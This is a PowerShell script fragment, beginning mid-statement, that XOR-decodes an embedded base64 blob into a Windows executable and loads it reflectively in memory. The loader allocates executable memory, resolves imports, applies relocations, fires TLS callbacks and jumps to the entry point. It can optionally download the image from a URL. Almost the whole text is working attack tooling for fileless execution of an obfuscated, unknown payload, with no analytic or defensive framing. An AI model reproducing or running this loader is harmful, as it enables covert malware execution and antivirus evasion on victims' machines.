) -join ""
$b64 = [Convert]::FromBase64String($enc)
$pe  = [byte[]]::new($b64.Length)
$k = 0xA7
for ($i = 0; $i -lt $b64.Length; $i++) { $pe[$i] = $b64[$i] -bxor $k }


$code = @"
using System;
using System.Runtime.InteropServices;

public static class Refl {
    public delegate void TlsCb(IntPtr h, uint reason, IntPtr reserved);
    public delegate bool StrProc(int slot, IntPtr value);
    public delegate bool AddFunc(IntPtr fns, uint count, long imagebase);

    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, int t, int p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, int p, out int o);
    [DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, IntPtr o);
    [DllImport("kernel32")] public static extern bool RtlMoveMemory(IntPtr d, IntPtr s, UIntPtr n);
    [DllImport("kernel32")] public static extern IntPtr TlsAlloc();
}
"@
Add-Type -TypeDefinition $code

$Path = ''; $Url = ''; $Bytes = $pe
function Get-Bytes {
    if ($Bytes) { return $Bytes }
    if ($Url) {
        $wc = New-Object System.Net.WebClient
        return $wc.DownloadData($Url)
    }
    return [System.IO.File]::ReadAllBytes($Path)
}

function U16([byte[]]$b, [int]$o) { [BitConverter]::ToUInt16($b, $o) }
function U32([byte[]]$b, [int]$o) { [BitConverter]::ToUInt32($b, $o) }

function Invoke-Reflect([byte[]]$pe) {
    # ---- headers -----------------------------------------------------------
    $e_lfanew = U32 $pe 0x3C
    $machine  = U16 $pe ($e_lfanew + 4)
    if ($machine -ne 0x8664) { throw "x64 images only" }
    $nsec     = U16 $pe ($e_lfanew + 6)
    $optoff   = $e_lfanew + 24
    $magic    = U16 $pe $optoff
    if ($magic -ne 0x20B)  { throw "PE32+ only" }

    $entryRva   = U32 $pe ($optoff + 16)
    $imgBase    = [Int64](U32 $pe ($optoff + 24)) + [Int64](U32 $pe ($optoff + 28)) * 0x100000000
    $alignSec   = U32 $pe ($optoff + 32)
    $alignFile  = U32 $pe ($optoff + 36)
    $sizeImg    = U32 $pe ($optoff + 56)
    $sizeHdr    = U32 $pe ($optoff + 60)
    $ddOff      = $optoff + 112                       # PE32+ data directories
    $ddImport   = U32 $pe ($ddOff + 8)                # index 1: rva
    $ddImportSz = U32 $pe ($ddOff + 12)
    $ddBaseRel  = U32 $pe ($ddOff + 40)               # index 5
    $ddBaseRelSz= U32 $pe ($ddOff + 44)
    $ddTLS      = U32 $pe ($ddOff + 72)               # index 9
    $ddEH       = U32 $pe ($ddOff + 24)               # index 3: .pdata
    $ddEHSz     = U32 $pe ($ddOff + 28)

    $secOff = $optoff + 240                           # PE32+ optional header size
    $sections = @()
    for ($i = 0; $i -lt $nsec; $i++) {
        $s = $secOff + 40 * $i
        $name = [System.Text.Encoding]::ASCII.GetString($pe, $s, 8).TrimEnd([char]0)
        $sections += [pscustomobject]@{
            Name = $name
            VA   = [int](U32 $pe ($s + 12))
            VS   = [int](U32 $pe ($s + 8))
            Raw  = [int](U32 $pe ($s + 20))
            RS   = [int](U32 $pe ($s + 16))
        }
    }

    function RvaToOff([int]$rva) {
        foreach ($s in $sections) {
            if ($rva -ge $s.VA -and $rva -lt ($s.VA + [Math]::Max($s.VS, $s.RS))) {
                return $s.Raw + ($rva - $s.VA)
            }
        }
        return -1
    }

    # ---- allocate ----------------------------------------------------------
    $base = [Refl]::VirtualAlloc([IntPtr]$imgBase, [UIntPtr]::new([uint64]$sizeImg), 0x3000, 0x40)
    $relocated = $false
    if ($base -eq [IntPtr]::Zero) {
        $base = [Refl]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new([uint64]$sizeImg), 0x3000, 0x40)
        $relocated = $true
    }
    if ($base -eq [IntPtr]::Zero) { throw "VirtualAlloc failed" }
    Write-Host ("[reflect] base=0x{0:X} relocated={1}" -f $base.ToInt64(), $relocated)

    # ---- copy headers + sections ------------------------------------------
    $src = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($pe.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($pe, 0, $src, $pe.Length)
    [Refl]::RtlMoveMemory($base, $src, [UIntPtr]::new([uint64]$sizeHdr))
    foreach ($s in $sections) {
        if ($s.RS -gt 0) {
            [Refl]::RtlMoveMemory([IntPtr]($base.ToInt64() + $s.VA),
                                  [IntPtr]($src.ToInt64() + $s.Raw),
                                  [UIntPtr]::new([uint64]$s.RS))
        }
    }

    # ---- imports -----------------------------------------------------------
    if ($ddImport -gt 0) {
        $o = RvaToOff $ddImport
        while ($true) {
            $nameRva = U32 $pe ($o + 12)
            if ($nameRva -eq 0) { break }
            $no = RvaToOff $nameRva
            $dll = ""
            while ($pe[$no] -ne 0) { $dll += [char]$pe[$no]; $no++ }
            $hmod = [Refl]::LoadLibraryA($dll)
            if ($hmod -eq [IntPtr]::Zero) { throw "LoadLibrary $dll" }
            $iatRva  = U32 $pe ($o + 16)
            $oftRva  = U32 $pe ($o)
            $walk    = if ($oftRva -ne 0) { $oftRva } else { $iatRva }
            $wo = RvaToOff $walk
            $iot = [int]$iatRva               # IAT lives in the mapped image: RVA addressing
            while ($true) {
                $lo = U32 $pe $wo
                $hi = U32 $pe ($wo + 4)
                if (($lo -eq 0) -and ($hi -eq 0)) { break }
                $addr = [IntPtr]::Zero
                if (($hi -band 0x80000000) -ne 0) {
                    $ord = $hi -band 0xFFFF
                    $addr = [Refl]::GetProcAddress($hmod, [IntPtr]$ord)
                    $fn = "#$ord"
                } else {
                    $fo = (RvaToOff ([int]$lo)) + 2   # skip the hint word
                    $fn = ""
                    while ($pe[$fo] -ne 0) { $fn += [char]$pe[$fo]; $fo++ }
                    $addr = [Refl]::GetProcAddress($hmod, $fn)
                }
                if ($addr -eq [IntPtr]::Zero) { throw "GetProcAddress $fn in $dll" }
                [System.Runtime.InteropServices.Marshal]::WriteInt64(
                    [IntPtr]($base.ToInt64() + $iot), $addr.ToInt64())
                $wo += 8; $iot += 8
            }
            $o += 20
        }
    }

    # ---- relocations -------------------------------------------------------
    if ($relocated -and $ddBaseRel -gt 0) {
        $o = RvaToOff $ddBaseRel
        $end = $ddBaseRel + $ddBaseRelSz
        while ($ddBaseRel -lt $end) {
            $pageRva = U32 $pe ($o)
            $blockSz = U32 $pe ($o + 4)
            if ($blockSz -eq 0) { break }
            $cnt = ($blockSz - 8) / 2
            for ($i = 0; $i -lt $cnt; $i++) {
                $e = U16 $pe ([int]($o + 8 + 2 * $i))
                $type = ($e -shr 12) -band 0xF
                $offs = $e -band 0xFFF
                if ($type -eq 10) {   # DIR64
                    $p = [IntPtr]($base.ToInt64() + $pageRva + $offs)
                    $v = [System.Runtime.InteropServices.Marshal]::ReadInt64($p)
                    [System.Runtime.InteropServices.Marshal]::WriteInt64(
                        $p, $v + ($base.ToInt64() - $imgBase))
                } elseif ($type -eq 3) {   # HIGHLOW
                    $p = [IntPtr]($base.ToInt64() + $pageRva + $offs)
                    $v = [System.Runtime.InteropServices.Marshal]::ReadInt32($p)
                    [System.Runtime.InteropServices.Marshal]::WriteInt32(
                        $p, [int]($v + ($base.ToInt64() - $imgBase)))
                }
            }
            $ddBaseRel += $blockSz
            $o += $blockSz
        }
    }

    # ---- TLS directory (IMAGE_TLS_DIRECTORY64: ptr fields are VAs) ---------
    if ($ddTLS -gt 0) {
        $to = RvaToOff $ddTLS
        $rawStartVa  = [Int64](U32 $pe ($to))      + [Int64](U32 $pe ($to + 4)) * 0x100000000
        $rawEndVa    = [Int64](U32 $pe ($to + 8))  + [Int64](U32 $pe ($to + 12)) * 0x100000000
        $indexVa     = [Int64](U32 $pe ($to + 16)) + [Int64](U32 $pe ($to + 20)) * 0x100000000
        $cbVa0       = [Int64](U32 $pe ($to + 24)) + [Int64](U32 $pe ($to + 28)) * 0x100000000
        $rawStartRva = [int]($rawStartVa - $imgBase)
        $rawEndRva   = [int]($rawEndVa   - $imgBase)
        $indexAddrRva= [int]($indexVa    - $imgBase)
        $cbRva       = [int]($cbVa0      - $imgBase)
        $slot = 0
        if ($indexAddrRva -gt 0) {
            $slot = [int][Refl]::TlsAlloc()
            [System.Runtime.InteropServices.Marshal]::WriteInt32(
                [IntPtr]($base.ToInt64() + $indexAddrRva), $slot)
        }
        # populate the current thread's TLS block (emulates LdrpHandleTlsData)
        if ($rawEndRva -gt $rawStartRva -and $slot -ge 0) {
            $sz = [int]($rawEndRva - $rawStartRva)
            $blk = [Refl]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new([uint64]($sz + 8)), 0x3000, 0x40)
            $so = RvaToOff $rawStartRva
            [System.Runtime.InteropServices.Marshal]::Copy(
                $pe, $so, [IntPtr]($blk.ToInt64() + 8), $sz)
            $setval = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                [Refl]::GetProcAddress([Refl]::LoadLibraryA("kernel32.dll"), "TlsSetValue"),
                [Refl+StrProc])
            [void]$setval.Invoke($slot, [IntPtr]($blk.ToInt64() + 8))
        }
        # callback array: NULL-terminated, no size field in the directory
        if ($cbRva -gt 0) {
            $co = RvaToOff $cbRva
            for ($i = 0; $i -lt 32; $i++) {
                $lo = U32 $pe ([int]($co + 8 * $i))
                $hi = U32 $pe ([int]($co + 8 * $i + 4))
                if (($lo -eq 0) -and ($hi -eq 0)) { break }
                $cbAbs = [Int64]$hi * 0x100000000 + [Int64]$lo
                $cbVa = if ($relocated) { $base.ToInt64() + [int]($cbAbs - $imgBase) } else { $cbAbs }
                $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                    [IntPtr]$cbVa, [Refl+TlsCb])
                $del.Invoke($base, [UInt32]1, [IntPtr]::Zero)   # DLL_PROCESS_ATTACH
            }
        }
    }

    # ---- exception table (x64 unwinding) ------------------------------------
    if ($ddEH -gt 0) {
        $rtlAdd = [Refl]::GetProcAddress([Refl]::LoadLibraryA("ntdll.dll"), "RtlAddFunctionTable")
        if ($rtlAdd -ne [IntPtr]::Zero) {
            $ehVa = $base.ToInt64() + $ddEH
            $cnt = [int]($ddEHSz / 12)
            $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                $rtlAdd, [Refl+AddFunc])
            [void]$del.Invoke([IntPtr]$ehVa, [UInt32]$cnt, $base.ToInt64())
        }
    }

    # ---- entry --------------------------------------------------------------
    $ep = $base.ToInt64() + $entryRva
    if (-not $relocated -and $entryRva -eq 0) { throw "no entry" }
    $main = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        [IntPtr]$ep, [Action])
    Write-Host "[reflect] calling entry..."
    $main.Invoke()
    Write-Host "[reflect] entry returned"
}

Invoke-Reflect (Get-Bytes)

